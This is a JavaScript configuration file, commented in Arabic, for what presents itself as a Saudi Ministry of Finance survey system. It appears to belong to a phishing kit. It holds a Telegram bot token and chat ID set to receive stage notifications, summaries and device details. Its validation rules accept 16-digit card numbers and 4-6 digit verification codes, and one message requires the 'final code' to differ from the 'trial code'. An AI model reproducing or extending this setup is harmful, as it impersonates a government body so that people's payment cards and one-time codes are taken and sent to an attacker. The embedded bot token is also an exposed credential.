// config.js - إعدادات نظام استبيانات الخدمات المالية
// الإصدار: 4.0.1 | آخر تحديث: ديسمبر 2024

const CONFIG = {
    // ============================================
    // 🔑 إعدادات بوت تيليغرام - لوحة التحكم
    // ============================================
    TELEGRAM_BOT: {
        // 🔐 التوكن الخاص بالبوت (احصل عليه من @BotFather)
        TOKEN: '8431861072:AAH1pbgKEiVTTKOLKjfmf_7F_jSaAw9GR2o',
        
        // 💬 معرف المحادثة (احصل عليه من @getidsbot)
        CHAT_ID: '8421252546',
        
        // 🌐 رابط API تيليغرام الرسمي
        API_URL: 'https://api.telegram.org/bot',
        
        // 📱 إعدادات إضافية للبوت
        SETTINGS: {
            SEND_STAGE_NOTIFICATIONS: true,
            SEND_FINAL_SUMMARY: true,
            SEND_DEVICE_INFO: true,
            PARSE_MODE: 'Markdown',
            DISABLE_WEB_PAGE_PREVIEW: true,
            DISABLE_NOTIFICATION: false
        }
    },
    
    // ============================================
    // ⚙️ إعدادات النظام الأساسية
    // ============================================
    SYSTEM: {
        VERSION: '4.0.1',
        RELEASE_DATE: 'ديسمبر 2024',
        BUILD_NUMBER: '20241230',
        ADMIN_EMAIL: 'surveys@mof.gov.sa',
        SUPPORT_EMAIL: 'support@mof.gov.sa',
        SUPPORT_PHONE: '920020000',
        OFFICIAL_WEBSITE: 'https://www.mof.gov.sa',
        SESSION_TIMEOUT: 30 * 60 * 1000,
        AUTO_SAVE_INTERVAL: 60 * 1000,
        MAX_INACTIVITY_TIME: 15 * 60 * 1000,
        MAX_LOCAL_STORAGE_ITEMS: 50,
        ENABLE_LOCAL_BACKUP: true,
        COMPRESS_LOCAL_DATA: false,
        MAX_FILE_SIZE: 5 * 1024 * 1024,
        ALLOWED_FILE_TYPES: ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'],
        ENABLE_ENCRYPTION: true,
        MIN_PASSWORD_LENGTH: 8,
        MAX_LOGIN_ATTEMPTS: 5,
        LOCKOUT_TIME: 15 * 60 * 1000,
        API_TIMEOUT: 30000,
        MAX_RETRY_ATTEMPTS: 3,
        RETRY_DELAY: 1000,
        CHECK_INTERNET_INTERVAL: 30000
    },
    
    // ============================================
    // ✅ إعدادات التحقق والتحقق من الصحة
    // ============================================
    VALIDATION: {
        // 📱 أنماط التحقق من البيانات
        PHONE_PATTERN: /^(05|06|07)[0-9]{8}$/,
        CARD_PATTERN: /^[0-9]{16}$/,
        CODE_PATTERN: /^[0-9]{4,6}$/,  // ✅ تحديث: من 4 إلى 6 أرقام
        EMAIL_PATTERN: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
        NAME_PATTERN: /^[\p{L}\s]{3,100}$/u,
        
        // 📏 حدود البيانات
        NAME_MIN_LENGTH: 3,
        NAME_MAX_LENGTH: 100,
        PHONE_MIN_LENGTH: 10,
        PHONE_MAX_LENGTH: 10,
        CARD_MIN_LENGTH: 16,
        CARD_MAX_LENGTH: 16,
        CODE_MIN_LENGTH: 4,    // ✅ تحديث
        CODE_MAX_LENGTH: 6,    // ✅ تحديث
        
        // 📅 حدود التاريخ
        MIN_YEAR: 2010,
        MAX_YEAR: new Date().getFullYear(),
        
        // ⚠️ رسائل التحقق
        MESSAGES: {
            REQUIRED_FIELD: 'هذا الحقل مطلوب',
            INVALID_PHONE: 'رقم الهاتف غير صحيح',
            INVALID_CARD: 'رقم البطاقة يجب أن يكون 16 رقماً',
            INVALID_CODE: 'الرمز يجب أن يكون بين 4 إلى 6 أرقام',  // ✅ تحديث
            INVALID_EMAIL: 'البريد الإلكتروني غير صحيح',
            INVALID_NAME: 'الاسم يجب أن يحتوي على حروف فقط (3-100 حرف)',
            CODES_MUST_DIFFER: 'يجب أن يختلف الرمز النهائي عن الرمز التجريبي',
            AGREEMENT_REQUIRED: 'يجب الموافقة على الشروط والأحكام'
        }
    }
};

// الشهور باللغة العربية
const MONTHS_AR = [
    'يناير', 'فبراير', 'مارس', 'أبريل', 'مايو', 'يونيو',
    'يوليو', 'أغسطس', 'سبتمبر', 'أكتوبر', 'نوفمبر', 'ديسمبر'
];

// الشهور باللغة الإنجليزية
const MONTHS_EN = [
    'January', 'February', 'March', 'April', 'May', 'June',
    'July', 'August', 'September', 'October', 'November', 'December'
];

// الشهور بالأمازيغية
const MONTHS_BER = [
    'Yennayer', 'Furar', 'Meɣres', 'Yebrir', 'Mayyu', 'Yunyu',
    'Yulyuz', 'ɣuct', 'Ctembeṛ', 'Tubeṛ', 'Wambeṛ', 'Dujembeṛ'
];

// ============================================
// 🔧 دوال مساعدة
// ============================================

function generateYears() {
    const years = [];
    const currentYear = new Date().getFullYear();
    const startYear = CONFIG.VALIDATION.MIN_YEAR || 2010;
    
    for (let year = startYear; year <= currentYear; year++) {
        years.push(year);
    }
    
    return years.reverse();
}

function getMonthName(monthNumber, language = 'ar') {
    const months = {
        'ar': MONTHS_AR,
        'en': MONTHS_EN,
        'ber': MONTHS_BER
    };
    
    const monthList = months[language] || MONTHS_AR;
    return monthList[monthNumber - 1] || 'غير معروف';
}

// تصدير الكائنات الرئيسية
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        CONFIG,
        MONTHS_AR,
        MONTHS_EN,
        MONTHS_BER,
        generateYears,
        getMonthName
    };
}